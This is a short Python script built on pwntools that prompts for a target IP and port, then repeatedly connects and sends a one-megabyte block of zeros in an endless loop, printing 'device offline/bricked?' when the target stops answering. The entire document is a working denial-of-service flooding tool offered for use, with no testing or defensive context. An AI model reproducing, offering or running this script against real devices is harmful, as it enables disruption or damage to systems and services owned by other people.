print("importing and prepping")
from pwn import *
from time import sleep
verylargestring = bytes("0" * 1000000, "utf-8")
print("done")
ip = input("ip:")
port = input("port:")
print("sending packets")
i = 0
while True:
    try:
        p = remote(ip, port)
        p.send(verylargestring)
        p.close()
    except:
        print('device offline/bricked?')
        p.close()
        sleep(5)
